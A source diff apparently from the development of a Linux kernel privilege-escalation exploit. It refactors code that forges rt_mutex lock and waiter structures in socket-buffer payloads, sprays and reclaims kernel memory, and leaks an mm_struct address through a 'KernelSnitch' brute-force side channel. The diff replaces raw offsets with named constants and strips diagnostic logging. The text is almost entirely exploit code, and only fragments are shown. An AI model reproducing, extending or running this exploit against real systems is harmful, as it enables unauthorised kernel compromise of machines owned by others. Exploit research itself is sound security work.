@@ -281,9 +281,9 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
 #endif
 
   put32(p, lock_off + 0x00, 0);
-  put64(p, lock_off + 0x08, waiter);
-  put64(p, lock_off + 0x10, waiter);
-  put64(p, lock_off + 0x18, lock_owner);
+  put64(p, lock_off + FAKE_LOCK_WAITERS_ROOT_OFF, waiter);
+  put64(p, lock_off + FAKE_LOCK_WAITERS_LEFTMOST_OFF, waiter);
+  put64(p, lock_off + FAKE_LOCK_OWNER_OFF, lock_owner);
   put_fake_waiter(p, waiter_off, 1, 0, 0, parent, pi_right, pi_left,
                   waiter_task, lock, waiter_prio);
   put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
@@ -788,9 +788,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         uintptr_t waiter = payload_base + waiter_off;
 
         put32(p, lock_off + 0x00, 0);
-        put64(p, lock_off + 0x08, waiter);
-        put64(p, lock_off + 0x10, waiter);
-        put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
+        put64(p, lock_off + FAKE_LOCK_WAITERS_ROOT_OFF, waiter);
+        put64(p, lock_off + FAKE_LOCK_WAITERS_LEFTMOST_OFF, waiter);
+        put64(p, lock_off + FAKE_LOCK_OWNER_OFF, SLIDE_LOCK_OWNER_VALUE);
 
         put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                         lock, SLIDE_FAKE_WAITER_PRIO);
@@ -921,13 +921,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, SLIDE_LOCK_OWNER_VALUE);
+      put64(p, LOCK_OFF + FAKE_LOCK_WAITERS_ROOT_OFF, fake_w0);
+      put64(p, LOCK_OFF + FAKE_LOCK_WAITERS_LEFTMOST_OFF, fake_w0);
+      put64(p, LOCK_OFF + FAKE_LOCK_OWNER_OFF, SLIDE_LOCK_OWNER_VALUE);
     } else {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
+      put64(p, LOCK_OFF + FAKE_LOCK_WAITERS_ROOT_OFF, fake_w0);
+      put64(p, LOCK_OFF + FAKE_LOCK_WAITERS_LEFTMOST_OFF, fake_w0);
+      put64(p, LOCK_OFF + FAKE_LOCK_OWNER_OFF, fake_task | 1);
     }
 
     put_fake_waiter(p, W0_OFF, 1, 0, 0, write_pc, write_right, write_left,
@@ -1029,11 +1029,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   cleanup_page_prepare_state();
 #endif
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
-#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
-    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
-  pr_info("kernel page diagnostic stage=begin mode=%d objects_per_slab=%zu\n",
-          payload_mode, mm_objs_per_slab);
-#endif
   prepare_ctxs();
 
   skb_buf = malloc(SKB_SEND_SIZE);
@@ -1085,11 +1080,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 #endif
 #endif
-#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
-    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
-  pr_info("kernel page diagnostic stage=kernelsnitch-ready mode=%d cpus=%d\n",
-          payload_mode, cpu_count);
-#endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -1106,13 +1096,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
-#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
-    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
-  pr_info("kernel page diagnostic stage=topology-ready prepare=%zu spray=%zu "
-          "pre=%zu post=%zu leak_pid=%d\n",
-          prepare_ctx.mm_cnt, spray_ctx.mm_cnt, pre_ctx.mm_cnt,
-          post_ctx.mm_cnt, child_leak);
-#endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     kill_child(pre_ctx.childs[i]);
@@ -1124,11 +1107,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(spray_ctx.childs[i]);
   }
   SYSCHK(waitpid(child_leak, NULL, 0));
-#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
-    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
-  pr_info("kernel page diagnostic stage=collision-search-return mode=%d\n",
-          payload_mode);
-#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   log_mm_slabinfo("after-child-exit");
 #endif
@@ -1148,19 +1126,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
-#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
-    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
-  pr_info("kernel page diagnostic stage=bruteforce-enter mode=%d\n",
-          payload_mode);
-#endif
   kernelsnitch_bruteforce(ks);
   uintptr_t leaked = ks->mm_struct;
-#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
-    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
-  pr_info("kernel page diagnostic stage=bruteforce-return mode=%d "
-          "leaked=%016zx\n",
-          payload_mode, leaked);
-#endif
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
@@ -1262,12 +1229,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
     return 0;
   }
-#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
-    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
-  pr_info("kernel page diagnostic stage=payload-ready mode=%d base=%016zx "
-          "fake_task=%016zx fake_lock=%016zx\n",
-          payload_mode, base, fake_task, fake_lock);
-#endif
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -1487,12 +1448,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           base);
 #endif
 
-#if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
-    APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
-  pr_info("kernel page diagnostic stage=complete mode=%d base=%016zx "
-          "reclaim_sent=%d/%d\n",
-          payload_mode, base, reclaim_sent, reclaim_sends);
-#endif
   return base;
 }
 
